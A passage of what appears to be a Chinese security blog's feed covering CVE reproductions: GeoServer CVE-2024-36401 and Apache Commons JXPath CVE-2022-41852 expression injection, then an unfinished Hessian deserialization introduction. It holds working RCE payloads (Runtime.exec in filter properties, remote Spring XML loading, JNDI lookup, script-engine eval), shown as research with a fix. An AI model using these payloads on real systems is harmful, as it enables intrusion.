&lt;/wfs:Query&gt;&lt;/wfs:GetFeature&gt;GET：/geoserver/wfs?request=GetFeature&amp;version=1.1.0&amp;typeName=topp:states&amp;formatName=GML2&amp;FILTER=%3Cogc:Filter%20xmlns:ogc=%22http://www.opengis.net/ogc%22%3E%3Cogc:PropertyIsGreaterThan%3E%3Cogc:Div%3E%3Cogc:PropertyName%3EMANUAL%3C/ogc:PropertyName%3E%3Cogc:PropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C/ogc:PropertyName%3E%3C/ogc:Div%3E%3Cogc:Literal%3E0.25%3C/ogc:Literal%3E%3C/ogc:PropertyIsGreaterThan%3E%3C/ogc:Filter%3E</code></pre>## WMS getMap<pre class="language-none"><code class="language-none">GET /geoserver/wms?version=1.3.0&amp;bbox=24,-130,50,-66&amp;Format=image/png&amp;request=GetMap&amp;width=550&amp;height=250&amp;crs=EPSG:4326&amp;SLD_BODY=%3CStyledLayerDescriptor+version%3D%221.1.0%22%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%3D%22fill%22%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%2F%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E HTTP/1.1Host: 127.0.0.1:8085</code></pre><pre class="language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;ogc:GetMap xmlns:ogc="http://www.opengis.net/ows"             xmlns:gml="http://www.opengis.net/gml"             version="1.2.0"            service="WMS"&gt;  &lt;StyledLayerDescriptor version="1.0.0"                          xsi:schemaLocation="http://www.opengis.net/sld StyledLayerDescriptor.xsd"                         xmlns="http://www.opengis.net/sld"                          xmlns:ogc="http://www.opengis.net/ogc"                          xmlns:xlink="http://www.w3.org/1999/xlink"                         xmlns:dave="http://blasby.com"                          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;    &lt;UserLayer&gt;      &lt;Name&gt;Inline&lt;/Name&gt;      &lt;InlineFeature&gt;        &lt;FeatureCollection&gt;          &lt;featureMember&gt;            &lt;BodyPart&gt;              &lt;Type&gt;Mouth&lt;/Type&gt;              &lt;polygonProperty&gt;                &lt;gml:Polygon&gt;                  &lt;gml:outerBoundaryIs&gt;                    &lt;gml:LinearRing&gt;                      &lt;gml:coordinates&gt;                        397,226 396,209 396,196 390,185 384,175 368,163 353,155 331,150 308,149 283,148 261,153 231,163                        209,175 195,189 186,209 182,221 187,226 193,214 195,205 200,197 203,192 215,185 226,177 241,171                        256,167 266,163 281,161 297,161 321,160 341,160 359,168 371,175 382,185 388,197 390,215 390,225                        394,226 397,226                      &lt;/gml:coordinates&gt;                    &lt;/gml:LinearRing&gt;                  &lt;/gml:outerBoundaryIs&gt;                &lt;/gml:Polygon&gt;              &lt;/polygonProperty&gt;            &lt;/BodyPart&gt;          &lt;/featureMember&gt;        &lt;/FeatureCollection&gt;      &lt;/InlineFeature&gt;      &lt;UserStyle&gt;        &lt;FeatureTypeStyle&gt;          &lt;Rule&gt;            &lt;Filter&gt;              &lt;Or&gt;                &lt;PropertyIsEqualTo&gt;                  &lt;PropertyName&gt;exec(java.lang.Runtime.getRuntime(),"calc")&lt;/PropertyName&gt;                  &lt;Literal&gt;Eye&lt;/Literal&gt;                &lt;/PropertyIsEqualTo&gt;              &lt;/Or&gt;            &lt;/Filter&gt;            &lt;PolygonSymbolizer&gt;              &lt;Fill&gt;                &lt;CssParameter name="fill"&gt;                  &lt;ogc:Literal&gt;#DD06E0&lt;/ogc:Literal&gt;                &lt;/CssParameter&gt;                &lt;CssParameter name="fill-opacity"&gt;                  &lt;ogc:Literal&gt;1.0&lt;/ogc:Literal&gt;                &lt;/CssParameter&gt;              &lt;/Fill&gt;              &lt;Stroke&gt;                &lt;CssParameter name="stroke"&gt;                  &lt;ogc:Literal&gt;#FF00FF&lt;/ogc:Literal&gt;                &lt;/CssParameter&gt;              &lt;/Stroke&gt;            &lt;/PolygonSymbolizer&gt;          &lt;/Rule&gt;        &lt;/FeatureTypeStyle&gt;      &lt;/UserStyle&gt;    &lt;/UserLayer&gt;  &lt;/StyledLayerDescriptor&gt;  &lt;BoundingBox&gt;    &lt;gml:coord&gt;      &lt;gml:X&gt;0&lt;/gml:X&gt;      &lt;gml:Y&gt;0&lt;/gml:Y&gt;    &lt;/gml:coord&gt;    &lt;gml:coord&gt;      &lt;gml:X&gt;500&lt;/gml:X&gt;      &lt;gml:Y&gt;500&lt;/gml:Y&gt;    &lt;/gml:coord&gt;  &lt;/BoundingBox&gt;  &lt;Output&gt;    &lt;Format&gt;image/jpeg&lt;/Format&gt;    &lt;Transparent&gt;false&lt;/Transparent&gt;    &lt;Size&gt;      &lt;Width&gt;501&lt;/Width&gt;      &lt;Height&gt;501&lt;/Height&gt;    &lt;/Size&gt;  &lt;/Output&gt;&lt;/ogc:GetMap&gt;</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></li><li><a href="https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/">https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 表达式注入 </tag>
            
            <tag> geoserver </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Commons JXPath</title>
      <link href="/2024/07/08/Apache-Commons-JXPath/"/>
      <url>/2024/07/08/Apache-Commons-JXPath/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Commons-JXPath"><a href="#Apache-Commons-JXPath" class="headerlink" title="Apache Commons JXPath"></a>Apache Commons JXPath</h1><p>Apache Commons JXPath是美国阿帕奇（Apache）基金会的一种 XPath 1.0 的基于 Java 的实现。JXPath 为使用 XPath 语法遍历 JavaBeans、DOM 和其他类型的对象的图形提供了 API。</p><p>依赖</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-jxpath<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-jxpath<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><h2 id="CVE-2022-41852"><a href="#CVE-2022-41852" class="headerlink" title="CVE-2022-41852"></a>CVE-2022-41852</h2><p>版本：&lt;=1.3<br>JXPath<br><img src="/img/24-7-8/1.png"><br>JXPath提供一个Extension Functions 扩展功能：JXPath 开箱即用地支持标准 XPath 函数。它还支持“标准”扩展函数（基本上是 Java 的桥梁）以及完全自定义的扩展函数。<br>基本是这个是漏洞的利用点，能直接调用java中相关静态方法和构造方法</p><p>利用：<br>1.通过调用对象的new创建一个对象<br>2.能够调用静态方法<br>3.或者是调用普通方法的方法(类似于invoke的用法？？)</p><p>对应类：PackageFunctions<br><img src="/img/24-7-8/2.png"><br>逻辑自己看代码（懒得解释了）</p><p>漏洞环境：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s<span class="token operator">=</span><span class="token string">"org.springframework.context.support.ClassPathXmlApplicationContext.new(\"http://127.0.0.1:8001/test.xml\")"</span><span class="token punctuation">;</span><span class="token class-name">JXPathContext</span> jxPathContext <span class="token operator">=</span> <span class="token class-name">JXPathContext</span><span class="token punctuation">.</span><span class="token function">newContext</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jxPathContext<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>getValue方法：<br><img src="/img/24-7-8/3.png"></p><p>实际上是调用了compute方法或者是computeValue方法<br><img src="/img/24-7-8/4.png"></p><p>类似的方法调用还有：iteratePointers/iterate<br><img src="/img/24-7-8/5.png"></p><h3 id="构造方法利用"><a href="#构造方法利用" class="headerlink" title="构造方法利用"></a>构造方法利用</h3><p>spring环境：</p><ul><li>**ClassPathXmlApplicationContext **</li><li>FileSystemXmlApplicationContext</li></ul><p><strong>利用</strong>：<br>直接利用远程加载spring配置文件，构造任意bean并调用任意方法实现RCE</p><p>弹计算器</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>cmd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>calc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span></code></pre><p>(其中class指定类名，constructor-arg构造方法参数，init-method初始bean要调用的方法)</p><p>看看<strong>ClassPathXmlApplicationContext</strong><br><img src="/img/24-7-8/6.png"><br>然后根据xml配置文件完成bean工厂的初始化，并创建对应的bean (通过AbstractAutowireCapableBeanFactory#invokeCustomInitMethod调用相关方法)<br><img src="/img/24-7-8/7.png"><br><strong>poc</strong><br><strong>仅适用于Spring环境</strong><br>1.开启http服务，放置对应恶意的spring配置文件，如上面的test.xml<br>2.编写注入表达式：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span>ClassPathXmlApplicationContext</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:8001/test.xml"</span><span class="token punctuation">)</span></code></pre><h3 id="静态方法调用的利用"><a href="#静态方法调用的利用" class="headerlink" title="静态方法调用的利用"></a>静态方法调用的利用</h3><p>对于这种demo的利用，我们可以关注到javax.naming.InitialContext#doLookup方法<br><img src="/img/24-7-8/8.png"><br>jndi注入，不分析了<br>一个静态方法干了两件事情，标准的能进行jndi注入</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s<span class="token operator">=</span><span class="token string">"javax.naming.InitialContext.doLookup(\"ldap://127.0.0.1:8085/CUhddZiV\")"</span><span class="token punctuation">;</span><span class="token class-name">JXPathContext</span> jxPathContext <span class="token operator">=</span> <span class="token class-name">JXPathContext</span><span class="token punctuation">.</span><span class="token function">newContext</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jxPathContext<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="普通方法调用"><a href="#普通方法调用" class="headerlink" title="普通方法调用"></a>普通方法调用</h3><p>根据官方逻辑：<a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html#Extension_Functions">https://commons.apache.org/proper/commons-jxpath/users-guide.html#Extension_Functions</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JXPathContext</span> context <span class="token operator">=</span> <span class="token class-name">JXPathContext</span><span class="token punctuation">.</span><span class="token function">newContext</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"exec(java.lang.Runtime.getRuntime(), 'calc')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>又或者我们利用ScriptEngineManager调用js实现rce</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'js'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>'<span class="token punctuation">)</span></code></pre><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>限制lib库使用，就是禁用java相关调用</p><pre class="language-java" data-language="java"><code class="language-java"> <span class="token keyword">var</span> pathContext <span class="token operator">=</span> <span class="token class-name">JXPathContext</span><span class="token punctuation">.</span><span class="token function">newContext</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Set empty function library</span>pathContext<span class="token punctuation">.</span><span class="token function">setFunctions</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FunctionLibrary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException</span><span class="token keyword">return</span> pathContext<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apache commons </tag>
            
            <tag> java安全 </tag>
            
            <tag> 表达式注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessian</title>
      <link href="/2024/06/07/Hessian/"/>
      <url>/2024/06/07/Hessian/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h1><p>Hessian是一个轻量级的remoting onhttp工具，是一个轻量级的Java序列化/反序列化框架，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。</p><p>RPC协议的一次远程通信过程如下</p><ul><li>客户端发起请求，并按照RPC协议格式填充信息</li><li>填充完毕后将二进制格式文件转化为流，通过传输协议进行传输</li><li>服务端接收到流后，将其转换为二进制格式文件，并按照RPC协议格式获取请求的信息并进行处理</li><li>处理完毕后将结果按照RPC协议格式写入二进制格式文件中并返回</li></ul><h2 id="各种反序列化机制"><a href="#各种反序列化机制" class="headerlink" title="各种反序列化机制"></a>各种反序列化机制</h2><p>在网络通信过程中，我们想传输的内容肯定不止局限于文本或二进制信息，假如我们想要传递给远端一个特定的对象，那么这时就需要用到序列化和反序列化这种技术了。<br>在Java中，序列化能够将一个Java对象转换为一串<strong>便于传输</strong>的字节序列。而反序列化与之相反，能够从字节序列中恢复出一个对象。参考<a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true">marshalsec.pdf</a>，我们可以将序列化/反序列化机制分大体分为两类</p><ul><li>基于Bean属性访问机制</li><li>基于Field机制</li></ul><h3 id="基于Bean属性访问机制"><a href="#基于Bean属性访问机制" class="headerlink" title="基于Bean属性访问机制"></a>基于Bean属性访问机制</h3><ul><li>SnakeYAML</li><li>jYAML</li><li>YamlBeans</li><li>Apache Flex BlazeDS</li><li>Red5 IO AMF</li><li>Jackson</li><li>Castor</li><li>Java XMLDecoder</li><li>…</li></ul><p>它们最基本的区别是如何在对象上设置属性值，它们有共同点，也有自己独有的不同处理方式。有的通过反射自动调用getter(xxx)和setter(xxx)访问对象属性，有的还需要调用默认Constructor，有的处理器（指的上面列出来的那些）在反序列化对象时，如果类对象的某些方法还满足自己设定的某些要求，也会被自动调用。还有XMLDecoder这种能调用对象任意方法的处理器。有的处理器在支持多态特性时，例如某个对象的某个属性是Object、Interface、abstruct等类型，为了在反序列化时能完整恢复，需要写入具体的类型信息，这时候可以指定更多的类，在反序列化时也会自动调用具体类对象的某些方法来设置这些对象的属性值。<br>这种机制的攻击面比基于Field机制的攻击面大，因为它们自动调用的方法以及在支持多态特性时自动调用方法比基于Field机制要多。</p><h3 id="基于Field机制"><a href="#基于Field机制" class="headerlink" title="基于Field机制"></a>基于Field机制</h3><p>基于Field机制的反序列化是通过特殊的native（方法或反射（最后也是使用了native方式）直接对Field进行赋值操作的机制，而不是通过getter、setter方式对属性赋值。</p><ul><li>Java Serialization</li><li>Kryo</li><li>Hessian</li><li>json-io</li><li>XStream</li><li>…</li></ul><p><strong>依赖</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.caucho<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.63<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>因为 Hessian 基于 HTTP 协议，所以通常通过 Web 应用来提供服务，以下为几种常见的模式</p><h3 id="Servlet项目"><a href="#Servlet项目" class="headerlink" title="Servlet项目"></a>Servlet项目</h3><p>通过把提供服务的类注册成 Servlet 的方式来作为 Server 端进行交互。<br>实现的接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>hessianserlet<span class="token punctuation">.</span>hessian</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Greeting</span> <span class="token punctuation">{</span><span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span> o<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编写Servlet继承HessianServlet</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>hessianserlet<span class="token punctuation">.</span>hessian</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">HessianServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"MyHessianServlet"</span><span class="token punctuation">,</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/hessian"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyHessianServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HessianServlet</span> <span class="token keyword">implements</span> <span class="token class-name">Greeting</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">HashMap</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"hello "</span><span class="token operator">+</span>o<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>配置好web.xml<br>除了将具体实现类继承自 HessianServlet 之外，还可以不继承，完全通过配置文件进行设置，将待调用的接口和类作为 HessianServlet 的初始化参数进行配置：<br>web.xml 配置如下：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>com.caucho.hessian.server.HessianServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>home-class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>com.yyjccc.hessianserlet.hessian.MyHessianServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>hone-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>com.yyjccc.hessianserlet.hessian.Greeting<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/hessian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span></code></pre><p>编写客户端远程调用，Client 端通过 com.caucho.hessian.client.HessianProxyFactory 工厂类创建对接口的代理对象，并进行调用，可以看到调用后执行了服务端的逻辑并返回了代码。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>hessianserlet<span class="token punctuation">.</span>hessian</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">HessianProxyFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> url<span class="token operator">=</span><span class="token string">"http://localhost:7878/hessian"</span><span class="token punctuation">;</span><span class="token class-name">HessianProxyFactory</span> factory<span 